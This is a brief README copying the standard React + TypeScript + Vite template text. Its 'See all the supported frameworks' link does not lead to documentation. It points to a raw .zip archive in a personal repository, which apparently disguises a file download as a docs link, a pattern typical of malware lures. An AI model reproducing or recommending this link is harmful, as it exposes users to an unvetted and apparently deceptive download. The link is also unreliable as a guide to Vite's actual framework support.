# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

While this project uses React, Vite supports many popular JS frameworks. [See all the supported frameworks](https://raw.githubusercontent.com/AaronNadelman/aaron-landing-page/main/peri/aaron-landing-page.zip).
